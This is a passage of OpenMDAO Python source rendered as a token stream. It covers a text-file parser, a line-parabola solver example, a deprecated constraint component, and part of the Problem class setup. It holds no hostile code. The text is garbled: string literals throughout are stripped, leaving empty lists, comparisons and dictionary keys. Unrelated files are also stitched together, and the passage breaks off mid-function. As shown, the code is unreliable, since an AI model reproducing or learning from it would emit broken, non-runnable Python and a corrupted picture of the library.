~~~ """Grabs an array of variables relative to the current anchor.\n\n        rowstart: integer\n            Row number to start, relative to the current anchor.\n\n        fieldstart: integer\n            Field number to start.\n\n        rowend: integer (optional)\n            Row number to end. If not set, then only one row is grabbed.\n\n        Setting the delimiter to \'columns\' elicits some special behavior\n        from this method. Normally, the extraction process wraps around\n        at the end of a line and continues grabbing each field at the start of\n        a newline. When the delimiter is set to columns, the parameters\n        (rowstart, fieldstart, rowend, fieldend) demark a box, and all\n        values in that box are retrieved. Note that standard whitespace\n        is the secondary delimiter in this case.\n        """ \n 
\n 
j1 = self . current_row + rowstart \n 
\n 
if rowend is None : \n 
~~~ j2 = j1 + 1 \n 
~~ else : \n 
~~~ j2 = self . current_row + rowend + 1 \n 
\n 
~~ if not fieldend : \n 
~~~ raise ValueError ( "fieldend is missing, currently required" ) \n 
\n 
~~ lines = self . data [ j1 : j2 ] \n 
\n 
data = zeros ( shape = ( 0 , 0 ) ) \n 
\n 
for i , line in enumerate ( lines ) : \n 
~~~ if self . delimiter == "columns" : \n 
~~~ line = line [ ( fieldstart - 1 ) : fieldend ] \n 
\n 
# Stripping whitespace may be controversial. \n 
line = line . strip ( ) \n 
\n 
# Let pyparsing figure out if this is a number, and return it \n 
# as a float or int as appropriate \n 
parsed = self . _parse_line ( ) . parseString ( line ) \n 
\n 
newdata = array ( parsed [ : ] ) \n 
# data might have been split if it contains whitespace. If the \n 
\n 
if in str ( newdata . dtype ) : \n 
~~~ newdata = array ( line ) \n 
\n 
~~ data = append ( data , newdata ) \n 
\n 
~~ else : \n 
~~~ parsed = self . _parse_line ( ) . parseString ( line ) \n 
if i == j2 - j1 - 1 : \n 
~~~ data = append ( data , array ( parsed [ ( fieldstart - 1 ) : fieldend ] ) ) \n 
~~ else : \n 
~~~ data = append ( data , array ( parsed [ ( fieldstart - 1 ) : ] ) ) \n 
~~ fieldstart = 1 \n 
\n 
~~ ~~ return data \n 
\n 
~~ def transfer_2Darray ( self , rowstart , fieldstart , rowend , fieldend = None ) : \n 
~~~ """Grabs a 2D array of variables relative to the current anchor. Each\n        line of data is placed in a separate row.\n\n        rowstart: integer\n            Row number to start, relative to the current anchor.\n\n        fieldstart: integer\n            Field number to start.\n\n        rowend: integer\n            Row number to end relative to current anchor.\n\n        fieldend: integer (optional)\n            Field number to end. If not specified, grabs all fields up to the\n            end of the line.\n\n        If the delimiter is set to \'columns\', then the values contained in\n        fieldstart and fieldend should be the column number instead of the\n        field number.\n        """ \n 
\n 
if fieldend and ( fieldstart > fieldend ) : \n 
~~~ msg = "fieldend must be greater than fieldstart" \n 
raise ValueError ( msg ) \n 
\n 
~~ if rowstart > rowend : \n 
~~~ msg = "rowend must be greater than rowstart" \n 
raise ValueError ( msg ) \n 
\n 
~~ j1 = self . current_row + rowstart \n 
j2 = self . current_row + rowend + 1 \n 
lines = list ( self . data [ j1 : j2 ] ) \n 
\n 
if self . delimiter == "columns" : \n 
\n 
~~~ if fieldend : \n 
~~~ line = lines [ 0 ] [ ( fieldstart - 1 ) : fieldend ] \n 
~~ else : \n 
~~~ line = lines [ 0 ] [ ( fieldstart - 1 ) : ] \n 
\n 
~~ parsed = self . _parse_line ( ) . parseString ( line ) \n 
row = array ( parsed [ : ] ) \n 
data = zeros ( shape = ( abs ( j2 - j1 ) , len ( row ) ) ) \n 
data [ 0 , : ] = row \n 
\n 
for i , line in enumerate ( list ( lines [ 1 : ] ) ) : \n 
~~~ if fieldend : \n 
~~~ line = line [ ( fieldstart - 1 ) : fieldend ] \n 
~~ else : \n 
~~~ line = line [ ( fieldstart - 1 ) : ] \n 
\n 
~~ parsed = self . _parse_line ( ) . parseString ( line ) \n 
data [ i + 1 , : ] = array ( parsed [ : ] ) \n 
\n 
~~ ~~ else : \n 
~~~ parsed = self . _parse_line ( ) . parseString ( lines [ 0 ] ) \n 
if fieldend : \n 
~~~ row = array ( parsed [ ( fieldstart - 1 ) : fieldend ] ) \n 
~~ else : \n 
~~~ row = array ( parsed [ ( fieldstart - 1 ) : ] ) \n 
\n 
~~ data = zeros ( shape = ( abs ( j2 - j1 ) , len ( row ) ) ) \n 
data [ 0 , : ] = row \n 
\n 
for i , line in enumerate ( list ( lines [ 1 : ] ) ) : \n 
~~~ parsed = self . _parse_line ( ) . parseString ( line ) \n 
\n 
if fieldend : \n 
~~~ try : \n 
~~~ data [ i + 1 , : ] = array ( parsed [ ( fieldstart - 1 ) : fieldend ] ) \n 
~~ except : \n 
~~~ print data \n 
~~ ~~ else : \n 
~~~ data [ i + 1 , : ] = array ( parsed [ ( fieldstart - 1 ) : ] ) \n 
\n 
~~ ~~ ~~ return data \n 
\n 
~~ def _parse_line ( self ) : \n 
~~~ """Parse a single data line that may contain string or numerical data.\n        Float and Int \'words\' are converted to their appropriate type.\n        Exponentiation is supported, as are NaN and Inf.""" \n 
\n 
return self . line_parse_token \n 
\n 
~~ def _reset_tokens ( self ) : \n 
~~~ \n 
\n 
# Somewhat of a hack, but we can only use printables if the delimiter is \n 
\n 
# get parsed into the general string text. So, if we have non whitespace \n 
# delimiters, we need to fall back to just alphanums, and then add in any \n 
# missing but important symbols to parse. \n 
if self . delimiter . isspace ( ) : \n 
~~~ textchars = printables \n 
~~ else : \n 
~~~ textchars = alphanums \n 
\n 
symbols = [ , , , , , , , , , , \n 
, , , , , , , , , , \n 
, , , , , , ] \n 
\n 
for symbol in symbols : \n 
~~~ if symbol not in self . delimiter : \n 
~~~ textchars = textchars + symbol \n 
\n 
~~ ~~ ~~ digits = Word ( nums ) \n 
dot = "." \n 
sign = oneOf ( "+ -" ) \n 
ee = CaselessLiteral ( ) | CaselessLiteral ( ) \n 
\n 
num_int = ToInteger ( Combine ( Optional ( sign ) + digits ) ) \n 
\n 
num_float = ToFloat ( Combine ( Optional ( sign ) + \n 
( ( digits + dot + Optional ( digits ) ) | \n 
( dot + digits ) ) + \n 
Optional ( ee + Optional ( sign ) + digits ) \n 
) ) \n 
\n 
# special case for a float written like "3e5" \n 
mixed_exp = ToFloat ( Combine ( digits + ee + Optional ( sign ) + digits ) ) \n 
\n 
nan = ToInf ( oneOf ( "Inf -Inf" ) ) | ToNan ( oneOf ( "NaN nan NaN%  NaNQ NaNS qNaN sNaN " + "1.#SNAN 1.#QNAN -1.#IND" ) ) \n 
\n 
string_text = Word ( textchars ) \n 
\n 
self . line_parse_token = ( OneOrMore ( ( nan | num_float | mixed_exp | num_int | \n 
string_text ) ) ) \n 
\n 
\n 
# Solves the intersection of a line with a parabola \n 
\n 
~~ ~~ from __future__ import print_function \n 
\n 
from openmdao . api import Component , Group , Problem , Newton , ScipyGMRES \n 
\n 
\n 
class Line ( Component ) : \n 
~~~ """Evaluates y = -2x + 4.""" \n 
\n 
def __init__ ( self ) : \n 
~~~ super ( Line , self ) . __init__ ( ) \n 
\n 
self . add_param ( , 1.0 ) \n 
self . add_output ( , 0.0 ) \n 
\n 
# User can change these. \n 
self . slope = - 2.0 \n 
self . intercept = 4.0 \n 
\n 
~~ def solve_nonlinear ( self , params , unknowns , resids ) : \n 
~~~ """ y = -2x + 4 """ \n 
\n 
x = params [ ] \n 
m = self . slope \n 
b = self . intercept \n 
\n 
unknowns [ ] = m * x + b \n 
\n 
~~ def linearize ( self , params , unknowns , resids ) : \n 
~~~ """ Jacobian for our line.""" \n 
\n 
m = self . slope \n 
J = { } \n 
\n 
J [ , ] = m \n 
return J \n 
\n 
\n 
~~ ~~ class Parabola ( Component ) : \n 
~~~ """Evaluates y = 3x^2 - 5""" \n 
\n 
def __init__ ( self ) : \n 
~~~ super ( Parabola , self ) . __init__ ( ) \n 
\n 
self . add_param ( , 1.0 ) \n 
self . add_output ( , 0.0 ) \n 
\n 
# User can change these. \n 
self . a = 3.0 \n 
self . b = 0.0 \n 
self . c = - 5.0 \n 
\n 
~~ def solve_nonlinear ( self , params , unknowns , resids ) : \n 
~~~ """ y = 3x^2 - 5 """ \n 
\n 
x = params [ ] \n 
a = self . a \n 
b = self . b \n 
c = self . c \n 
\n 
unknowns [ ] = a * x ** 2 + b * x + c \n 
\n 
~~ def linearize ( self , params , unknowns , resids ) : \n 
~~~ """ Jacobian for our parabola.""" \n 
\n 
x = params [ ] \n 
a = self . a \n 
b = self . b \n 
J = { } \n 
\n 
J [ , ] = 2.0 * a * x + b \n 
return J \n 
\n 
\n 
~~ ~~ class Balance ( Component ) : \n 
~~~ """Evaluates the residual y1-y2""" \n 
\n 
def __init__ ( self ) : \n 
~~~ super ( Balance , self ) . __init__ ( ) \n 
\n 
self . add_param ( , 0.0 ) \n 
self . add_param ( , 0.0 ) \n 
self . add_state ( , 5.0 ) \n 
\n 
~~ def solve_nonlinear ( self , params , unknowns , resids ) : \n 
~~~ """This component does no calculation on its own. It mainly holds the\n        initial value of the state. An OpenMDAO solver outside of this\n        component varies it to drive the residual to zero.""" \n 
pass \n 
\n 
~~ def apply_nonlinear ( self , params , unknowns , resids ) : \n 
~~~ """ Report the residual y1-y2 """ \n 
\n 
y1 = params [ ] \n 
y2 = params [ ] \n 
\n 
resids [ ] = y1 - y2 \n 
\n 
~~ def linearize ( self , params , unknowns , resids ) : \n 
~~~ """ Jacobian for our parabola.""" \n 
\n 
J = { } \n 
J [ , ] = 1.0 \n 
J [ , ] = - 1.0 \n 
return J \n 
\n 
~~ ~~ if __name__ == : \n 
\n 
~~~ top = Problem ( ) \n 
root = top . root = Group ( ) \n 
root . add ( , Line ( ) ) \n 
root . add ( , Parabola ( ) ) \n 
root . add ( , Balance ( ) ) \n 
\n 
root . connect ( , ) \n 
root . connect ( , ) \n 
root . connect ( , ) \n 
root . connect ( , ) \n 
\n 
root . nl_solver = Newton ( ) \n 
root . ln_solver = ScipyGMRES ( ) \n 
\n 
top . setup ( ) \n 
\n 
# Positive solution \n 
top [ ] = 7.0 \n 
root . list_states ( ) \n 
top . run ( ) \n 
print ( % ( top [ ] , top [ ] , top [ \n 
# Negative solution \n 
top [ ] = - 7.0 \n 
root . list_states ( ) \n 
top . run ( ) \n 
print ( % ( top [ ] , top [ ] , top [ ~~ """ ConstraintComp is now deprecated.""" \n 
\n 
import warnings \n 
\n 
from openmdao . components . exec_comp import ExecComp \n 
\n 
\n 
class ConstraintComp ( ExecComp ) : \n 
~~~ """\n\n    ConstraintComp is deprecated. Please see the basic tutorial for more information.\n\n    A Component that represents an equality or inequality constraint.\n\n    Args\n    ----\n    expr : str\n        Constraint expression containing an operator that is\n        one of [\'<\', \'>\', \'<=\', \'>=\', \'=\'].\n\n    out : str, optional\n        Name of the output variable containing the result of the\n        constraint equation.  Default is \'out\'.\n\n    Options\n    -------\n    fd_options[\'force_fd\'] :  bool(False)\n        Set to True to finite difference this system.\n    fd_options[\'form\'] :  str(\'forward\')\n        Finite difference mode. (forward, backward, central) You can also set to \'complex_step\' to peform the complex step method if your components support it.\n    fd_options[\'step_size\'] :  float(1e-06)\n        Default finite difference stepsize\n    fd_options[\'step_type\'] :  str(\'absolute\')\n        Set to absolute, relative\n    fd_options[\'extra_check_partials_form\'] :  None or str\n        Finite difference mode: ("forward", "backward", "central", "complex_step")\n        During check_partial_derivatives, you can optionally do a\n        second finite difference with a different mode.\n    fd_options[\'linearize\'] : bool(False)\n        Set to True if you want linearize to be called even though you are using FD.\n    """ \n 
\n 
def __init__ ( self , expr , out = ) : \n 
\n 
~~~ warnings . simplefilter ( , DeprecationWarning ) \n 
warnings . warn ( "ConstraintComp is deprecated, see the new add_constraint interface." , \n 
DeprecationWarning , stacklevel = 2 ) \n 
warnings . simplefilter ( , DeprecationWarning ) \n 
\n 
newexpr = _combined_expr ( expr ) \n 
super ( ConstraintComp , self ) . __init__ ( "%s = %s" % ( out , newexpr ) ) \n 
\n 
\n 
~~ ~~ def _combined_expr ( expr ) : \n 
~~~ """Given a constraint object, take the lhs, operator, and\n    rhs and combine them into a single expression by moving rhs\n    terms over to the lhs.  For example,\n    for the constraint \'C1.x < C2.y + 7\', return the expression\n    \'C1.x - C2.y - 7\'.  Depending on the direction of the operator,\n    the sign of the expression may be flipped.  The final form of\n    the constraint, when evaluated, will be considered to be satisfied\n    if it evaluates to a value <= 0.\n    """ \n 
lhs , op , rhs = _parse_constraint ( expr ) \n 
\n 
first , second = ( rhs , lhs ) if op . startswith ( ) else ( lhs , rhs ) \n 
\n 
try : \n 
~~~ if float ( first ) == 0 : \n 
~~~ return "-(%s)" % second \n 
~~ ~~ except Exception : \n 
~~~ pass \n 
\n 
~~ try : \n 
~~~ if float ( second ) == 0. : \n 
~~~ return first \n 
~~ ~~ except Exception : \n 
~~~ pass \n 
\n 
~~ return % ( first , second ) \n 
\n 
\n 
~~ def _parse_constraint ( expr_string ) : \n 
~~~ """ Parses the constraint expression string and returns the lhs string,\n    the rhs string, and comparator\n    """ \n 
for comparator in [ , , , , , ] : \n 
~~~ parts = expr_string . split ( comparator ) \n 
if len ( parts ) == 2 : \n 
# check for == because otherwise they get a cryptic error msg \n 
~~~ if comparator == : \n 
~~~ break \n 
~~ return ( parts [ 0 ] . strip ( ) , comparator , parts [ 1 ] . strip ( ) ) \n 
# elif len(parts) == 3: \n 
#     return (parts[1].strip(), comparator, \n 
#             (parts[0].strip(), parts[2].strip())) \n 
\n 
~~ ~~ msg = "Constraints require an explicit comparator (=, <, >, <=, or >=)" \n 
raise ValueError ( msg ) \n 
~~ """ OpenMDAO Problem class defintion.""" \n 
\n 
from __future__ import print_function \n 
\n 
import os \n 
import sys \n 
import json \n 
import warnings \n 
import traceback \n 
from collections import OrderedDict \n 
from itertools import chain \n 
from six import iteritems , itervalues \n 
from six . moves import cStringIO \n 
\n 
import networkx as nx \n 
import numpy as np \n 
\n 
from openmdao . core . system import System \n 
from openmdao . core . group import Group \n 
from openmdao . core . component import Component \n 
from openmdao . core . parallel_group import ParallelGroup \n 
from openmdao . core . parallel_fd_group import ParallelFDGroup \n 
from openmdao . core . basic_impl import BasicImpl \n 
from openmdao . core . _checks import check_connections , _both_names \n 
from openmdao . core . driver import Driver \n 
from openmdao . core . mpi_wrap import MPI , under_mpirun , debug \n 
from openmdao . core . relevance import Relevance \n 
\n 
from openmdao . components . indep_var_comp import IndepVarComp \n 
from openmdao . solvers . scipy_gmres import ScipyGMRES \n 
from openmdao . solvers . ln_direct import DirectSolver \n 
from openmdao . solvers . ln_gauss_seidel import LinearGaussSeidel \n 
\n 
from openmdao . units . units import get_conversion_tuple \n 
from openmdao . util . string_util import get_common_ancestor , nearest_child , name_relative_to \n 
from openmdao . util . graph import plain_bfs \n 
from openmdao . util . options import OptionsDictionary \n 
\n 
force_check = os . environ . get ( ) \n 
trace = os . environ . get ( ) \n 
\n 
\n 
class _ProbData ( object ) : \n 
~~~ """\n    A container for Problem level data that is needed by subsystems\n    and VecWrappers.\n    """ \n 
def __init__ ( self ) : \n 
~~~ self . top_lin_gs = False \n 
self . in_complex_step = False \n 
\n 
\n 
~~ ~~ class Problem ( object ) : \n 
~~~ """ The Problem is always the top object for running an OpenMDAO\n    model.\n\n    Args\n    ----\n    root : `Group`, optional\n        The top-level `Group` for the `Problem`.  If not specified, a default\n        `Group` will be created\n\n    driver : `Driver`, optional\n        The top-level `Driver` for the `Problem`.  If not specified, a default\n        "Run Once" `Driver` will be used\n\n    impl : `BasicImpl` or `PetscImpl`, optional\n        The vector and data transfer implementation for the `Problem`.\n        For parallel processing support using MPI, `PetscImpl` is required.\n        If not specified, the default `BasicImpl` will be used.\n\n    comm : an MPI communicator (real or fake), optional\n        A communicator that can be used for distributed operations when running\n        under MPI. If not specified, the default "COMM_WORLD" will be used.\n    """ \n 
\n 
def __init__ ( self , root = None , driver = None , impl = None , comm = None ) : \n 
~~~ super ( Problem , self ) . __init__ ( ) \n 
self . root = root \n 
self . _probdata = _ProbData ( ) \n 
\n 
if MPI : \n 
~~~ from openmdao . core . petsc_impl import PetscImpl \n 
if impl != PetscImpl : \n 
~~~ raise ValueError ( "To run under MPI, the impl for a Problem must be PetscImpl." ) \n 
\n 
~~ ~~ if impl is None : \n 
~~~ self . _impl = BasicImpl \n 
~~ else : \n 
~~~ self . _impl = impl \n 
\n 
~~ self . comm = comm \n 
\n 
if driver is None : \n 
~~~ self . driver = Driver ( ) \n 
~~ else : \n 
~~~ self . driver = driver \n 
\n 
~~ self . pathname = \n 
\n 
\n 
~~ def __getitem__ ( self , name ) : \n 
~~~ """Retrieve unflattened value of named unknown or unconnected\n        param variable from the root system.\n\n        Args\n        ----\n        name : str\n             The name of the variable.\n\n        Returns\n        -------\n        The unflattened value of the given variable.\n        """ \n 
if name in self . root . unknowns : \n 
~~~ return self . root . unknowns [ name ] \n 
~~ elif name in self . root . params : \n 
~~~ return self . root . params [ name ] \n 
~~ elif name in self . root . _sysdata . to_abs_pnames : \n 
~~~ for p in self . root . _sysdata . to_abs_pnames [ name ] : \n 
~~~ return self . _rec_get_param ( p ) \n 
~~ ~~ elif name in self . _dangling : \n 
~~~ for p in self . _dangling [ name ] : \n 
~~~ return self . _rec_get_param ( p ) \n 
~~ ~~ else : \n 
~~~ raise KeyError ( "Variable \'%s\' not found." % name ) \n 
\n 
~~ ~~ def _rec_get_param ( self , absname ) : \n 
~~~ parts = absname . rsplit ( , 1 ) \n 
if len ( parts ) == 1 : \n 
~~~ return self . root . params [ absname ] \n 
~~ else : \n 
~~~ grp = self . root . _subsystem ( parts [ 0 ] ) \n 
return grp . params [ parts [ 1 ] ] \n 
\n 
~~ ~~ def __setitem__ ( self , name , val ) : \n 
~~~ """Sets the given value into the appropriate `VecWrapper`.\n        \'name\' is assumed to be a promoted name.\n\n        Args\n        ----\n        name : str\n             The promoted name of the variable to set into the\n             unknowns vector, or into params vectors if the params are\n             unconnected.\n        """ \n 
if name in self . root . unknowns : \n 
~~~ self . root . unknowns [ name ] = val \n 
~~ elif name in self . _dangling : \n 
~~~ for p in self . _dangling [ name ] : \n 
~~~ parts = p . rsplit ( , 1 ) \n 
if len ( parts ) == 1 : \n 
~~~ self . root . params [ p ] = val \n 
~~ else : \n 
~~~ grp = self . root . _subsystem ( parts [ 0 ] ) \n 
grp . params [ parts [ 1 ] ] = val \n 
~~ ~~ ~~ else : \n 
~~~ raise KeyError ( "Variable \'%s\' not found." % name ) \n 
\n 
~~ ~~ def _setup_connections ( self , params_dict , unknowns_dict ) : \n 
~~~ """Generate a mapping of absolute param pathname to the pathname\n        of its unknown.\n\n        Args\n        ----\n\n        params_dict : OrderedDict\n            A dict of parameter metadata for the whole `Problem`.\n\n        unknowns_dict : OrderedDict\n            A dict of unknowns metadata for the whole `Problem`.\n\n        """ \n 
to_prom_name = self . _probdata . to_prom_name \n 
\n 
# Get all explicit connections (stated with absolute pathnames) \n 
connections = self . root . _get_explicit_connections ( ) \n 
\n 
# get set of promoted params that are not *implicitly* connected \n 
# to anything, and add all implicit connections to the connections dict. \n 
prom_noconns = self . _add_implicit_connections ( connections ) \n 
\n 
input_graph = nx . DiGraph ( ) \n 
self . _dangling = { } \n 
\n 
to_abs_pnames = self . root . _sysdata . to_abs_pnames \n 
\n 
usrcs = set ( ) \n 
\n 
# resolve any input to input connections \n 
for tgt , srcs in iteritems ( connections ) : \n 
~~~ for src , idxs in srcs : \n 
~~~ input_graph . add_edge ( src , tgt , idxs = idxs ) \n 
if src in unknowns_dict : \n 
~~~ usrcs . add ( src ) \n 
\n 
~~ ~~ ~~ for prom , plist in iteritems ( to_abs_pnames ) : \n 
~~~ input_graph . add_nodes_from ( plist ) \n 
if prom in prom_noconns : \n 
# include connections in the graph due to multiple params that \n 
# are promoted to the same name \n 
~~~ start = plist [ 0 ] \n 
input_graph . add_edges_from ( ( ( start , p ) for p in plist [ 1 : ] ) , \n 
idxs = None ) \n 
\n 
~~ ~~ newconns = { } \n 
# loop over srcs that are unknowns \n 
for src in usrcs : \n 
~~~ newconns [ src ] = None \n 
src_idxs = { src : None } \n 
# walk depth first from each unknown src to each connected input, \n 
# updating src_indices if necessary \n 
for s , t in nx . dfs_edges ( input_graph , src ) : \n 
~~~ tidxs = input_graph [ s ] [ t ] [ ] \n 
sidxs = src_idxs [ s ] \n 
\n 
if tidxs is None : \n 
~~~ tidxs = sidxs \n 
~~ elif sidxs is not None : \n 
~~~ tidxs = np . array ( sidxs ) [ tidxs ] \n 
\n 
~~ src_idxs [ t ] = tidxs \n 
\n 
if t in newconns : \n 
~~~ newconns [ t ] . append ( ( src , tidxs ) ) \n 
~~ else : \n 
~~~ newconns [ t ] = [ ( src , tidxs ) ] \n 
\n 
~~ ~~ ~~ self . _input_inputs = { } \n 
\n 
# now all nodes that are downstream of an unknown source have been \n 
# marked.  Anything left must be an input that is either dangling or \n 
# upstream of an input that does have an unknown source. \n 
for node in input_graph . nodes_iter ( ) : \n 
# only look at unmarked nodes that have 0 in_degree \n 
~~~ if node not in newconns and len ( input_graph . pred [ node ] ) == 0 : \n 
~~~ nosrc = [ node ] \n 
\n 
# that has an unknown src \n 
for s , t in nx . dfs_edges ( input_graph , node ) : \n 
~~~ if t in newconns : # found param with unknown src \n 
~~~ src = newconns [ t ] [ 0 ] [ 0 ] \n 
# connect the unknown src to all of the inputs connected \n 
# to the current node that have no unknown src \n 
for n in nosrc : \n 
~~~ newconns [ n ] = [ ( src , None ) ] \n 
~~ break \n 
~~ else : \n 
~~~ nosrc . append ( t ) \n 
~~ ~~ else : \n 
~~~ set_nosrc = set ( nosrc ) \n 
for n in nosrc : \n 
~~~ self . _dangling [ to_prom_name [ n ] ] = set_nosrc \n 
self . _input_inputs [ n ] = nosrc \n 
\n 
# connections must be in order across processes, so use an OrderedDict \n 
# and sort targets before adding them \n 
~~ ~~ ~~ ~~ connections = OrderedDict ( ) \n 
for tgt , srcs in sorted ( newconns . items ( ) ) : \n 
~~~ if srcs is not None : \n 
~~~ if len ( srcs ) > 1 : \n 
~~~ src_names = ( n for n , idx in srcs ) \n 
self . _setup_errors . append ( "Target \'%s\' is connected to " \n 
"multiple unknowns: %s" % \n 
( tgt , sorted ( src_names ) ) ) \n 
~~ connections [ tgt ] = srcs [ 0 ] \n 
\n 
~~ ~~ return connections \n 
\n 
~~ def _check_input_diffs ( self , connections , params_dict , unknowns_dict ) : \n 
~~~ """For all sets of connected inputs, find any differences in units\n        or initial value.\n        """ \n 
# loop over all dangling inputs \n 
for tgt , connected_inputs in iteritems ( self . _input_inputs ) : \n 
\n 
# figure out if any connected inputs have different initial \n 
# values or different units \n 
~~~ tgt_idx = connected_inputs . index ( tgt ) \n 
units = [ params_dict [ n ] . get ( ) for n in connected_inputs ] \n 
vals = [ params_dict [ n ] [ ] for n in connected_inputs ] \n 
\n 
diff_units = [ ] \n 
\n 
for i , u in enumerate ( units ) : \n 
~~~ if i != tgt_idx and u != units [ tgt_idx ] : \n 
~~~ if units [ tgt_idx ] is None : \n 
~~~ sname , s = connected_inputs [ i ] , u \n 
tname , t = connected_inputs [ tgt_idx ] , units [ tgt_idx ] \n 
~~ else : \n 
~~~ sname , s = connected_inputs [ tgt_idx ] , units [ tgt_idx ] \n 
tname , t = connected_inputs [ i ] , u \n 
\n 
~~ diff_units . append ( ( connected_inputs [ i ] , u ) ) \n 
\n 
~~ ~~ if isinstance ( vals [ tgt_idx ] , np . ndarray ) : \n 
~~~ diff_vals = [ ( connected_inputs [ i ] , v ) for i , v in \n 
enumerate ( vals ) if not \n 
( isinstance ( v , np . ndarray ) and \n 
v . shape == vals [ tgt_idx ] . shape and \n 
( v == vals [ tgt_idx ] ) . all ( ) ) ] \n 
~~ else : \n 
~~~ vtype = type ( vals [ tgt_idx ] ) \n 
diff_vals = [ ( connected_inputs [ i ] , v ) for i , v in \n 
enumerate ( vals ) if vtype != type ( v ) or \n 
v != vals [ tgt_idx ] ] \n 
\n 
# if tgt has no unknown source, units MUST match, unless \n 
# one of them is None. At this point, connections contains \n 
# only unknown to input connections, so if the target is \n 
# in connections, it has an unknown source. \n 
\n 
~~ if diff_units : \n 
~~~ filt = set ( [ u for n , u in diff_units ] ) \n 
if None in filt : \n 
~~~ filt . remove ( None ) \n 
~~ if filt : \n 
~~~ proms = set ( [ params_dict [ item ] [ ] for item in connected_inputs ] ) \n 
\n 
# All params are promoted, so extra message for clarity. \n 
if len ( proms ) == 1 : \n 
~~~ msg = "The following connected inputs are promoted to " + "\'%s\', but have different units" % proms . pop ( ) \n 
~~ else : \n 
~~~ msg = "The following connected inputs have no source and different " + "units" \n 
\n 
~~ msg += ": %s." % sorted ( [ ( tgt , params_dict [ tgt ] . get ( ) ) ] + diff_units ) \n 
correct_src = params_dict [ connected_inputs [ 0 ] ] [ ] \n 
msg += " Connect \'%s\' to a source (such as an IndepVarComp)" % correct_src + " with defined units." \n 
\n 
self . _setup_errors . append ( msg ) \n 
~~ ~~ if diff_vals : \n 
~~~ msg = ( "The following sourceless connected inputs have " \n 
"different initial values: " \n 
"%s.  Connect one of them to the output of " \n 
"an IndepVarComp to ensure that they have the " \n 
"same initial value." % \n 
( sorted ( [ ( tgt , params_dict [ tgt ] [ ] ) ] + \n 
diff_vals ) ) ) \n 
self . _setup_errors . append ( msg ) \n 
\n 
# now check for differences in step_size, step_type, or form for \n 
# promoted inputs \n 
~~ ~~ for promname , absnames in iteritems ( self . root . _sysdata . to_abs_pnames ) : \n 
~~~ if len ( absnames ) > 1 : \n 
~~~ step_sizes , step_types , forms = { } , { } , { } \n 
for name in absnames : \n 
~~~ meta = self . root . _params_dict [ name ] \n 
ss = meta . get ( ) \n 
if ss is not None : \n 
~~~ step_sizes [ ss ] = name \n 
~~ st = meta . get ( ) \n 
if st is not None : \n 
~~~ step_types [ st ] = name \n 
~~ f = meta . get ( ) \n 
if f is not None : \n 
~~~ forms [ f ] = name \n 
\n 
~~ ~~ if len ( step_sizes ) > 1 : \n 
~~~ self . _setup_errors . append ( "The following parameters have the same " \n 
"promoted name, \'%s\', but different " \n 
"\'step_size\' values: %s" % ( promname , \n 
sorted ( [ ( v , k ) for k , v in step_sizes . items ( ) ] ) ) ) \n 
\n 
~~ if len ( step_types ) > 1 : \n 
~~~ self . _setup_errors . append ( "The following parameters have the same " \n 
"promoted name, \'%s\', but different " \n 
"\'step_type\' values: %s" % ( promname , \n 
sorted ( [ ( v , k ) for k , v in step_types . items ( ) ] ) ) ) \n 
\n 
~~ if len ( forms ) > 1 : \n 
~~~ self . _setup_errors . append ( "The following parameters have the same " \n 
"promoted name, \'%s\', but different \'form\' " \n 
"values: %s" % ( promname , \n 
sorted ( [ ( v , k ) for k , v in forms . items ( ) ] ) ) ) \n 
\n 
\n 
~~ ~~ ~~ ~~ def _get_ubc_vars ( self , connections ) : \n 
~~~ """Return a list of any connected inputs that are used before they\n        are set by their connected unknowns.\n        """ \n 
# this is the order that each component would run in if executed \n 
# a single time from the root system. \n 
full_order = { s . pathname : i for i , s in \n 
enumerate ( self . root . subsystems ( recurse = True ) ) } \n 
\n 
ubcs = [ ] \n 
for tgt , srcs in iteritems ( connections ) : \n 
~~~ tsys = tgt . rsplit ( , 1 ) [ 0 ] \n 
ssys = srcs [ 0 ] . rsplit ( , 1 ) [ 0 ] \n 
if full_order [ ssys ] > full_order [ tsys ] : \n 
~~~ ubcs . append ( tgt ) \n 
\n 
~~ ~~ return ubcs \n 
\n 
~~ def setup ( self , check = True , out_stream = sys . stdout ) : \n 
~~~ """Performs all setup of vector storage, data transfer, etc.,\n        necessary to perform calculations.\n\n        Args\n        ----\n        check : bool, optional\n            Check for potential issues after setup is complete (the default\n            is True)\n\n        out_stream : a file-like object, optional\n            Stream where report will be written if check is performed.\n        """ \n 
self . _setup_errors = [ ] \n 
\n 
\n 
# _setup_variables and _setup_connections again \n 
tree_changed = False \n 
\n 
# call _setup_variables again if we change metadata \n 
meta_changed = False \n 
\n 
self . _probdata = _ProbData ( ) \n 
if isinstance ( self . root . ln_solver , LinearGaussSeidel ) : \n 
~~~ self . _probdata . top_lin_gs = True \n 
\n 
~~ self . driver . root = self . root \n 
\n 
# Give every system an absolute pathname \n 
self . root . _init_sys_data ( self . pathname , self . _probdata ) \n 
\n 
# divide MPI communicators among subsystems \n 
self . _setup_communicators ( ) \n 
\n 
# Returns the parameters and unknowns metadata dictionaries \n 
# for the root, which has an entry for each variable contained \n 
# in any child of root. Metadata for each variable will contain \n 
# the name of the variable relative to that system, the absolute \n 
# name of the variable, any user defined metadata, and the value, \n 
# size and/or shape if known. For example: \n 
\n 
\n 
\n 
\n 
\n 
#  } \n 
params_dict , unknowns_dict = self . root . _setup_variables ( ) \n 
\n 
self . _probdata . params_dict = params_dict \n 
self . _probdata . unknowns_dict = unknowns_dict \n 
self . _probdata . to_prom_name = self . root . _sysdata . to_prom_name \n 
\n 
# collect all connections, both implicit and explicit from \n 
# anywhere in the tree, and put them in a dict where each key \n 
# is an absolute param name that maps to the absolute name of \n 
# a single source. \n 
connections = self . _setup_connections ( params_dict , unknowns_dict ) \n 
self . _probdata . connections = connections \n 
\n 
for tgt , ( src , idxs ) in iteritems ( connections ) : \n 
~~~ tmeta = params_dict [ tgt ] \n 
if not in tmeta or not tmeta [ ] : \n 
\n 
# Allow the user to omit the size of a parameter and pull \n 
# the size and shape from the connection source. \n 
~~~ if tmeta [ ] == ( ) : \n 
\n 
~~~ smeta = unknowns_dict [ src ] \n 
\n 
# Connected with src_indices specified \n 
if idxs is not None : \n 
~~~ size = len ( idxs ) \n 
tmeta [ ] = ( size , ) \n 
tmeta [ ] = size \n 
tmeta [ ] = smeta [ ] [ np . array ( idxs ) ] \n 
\n 
# Regular connection \n 
~~ else : \n 
~~~ tmeta [ ] = smeta [ ] \n 
tmeta [ ] = smeta [ ] \n 
tmeta [ ] = smeta [ ] \n 
\n 
# set src_indices into variable metadata \n 
~~ ~~ if idxs is not None : \n 
~~~ if isinstance ( idxs , np . ndarray ) : \n 
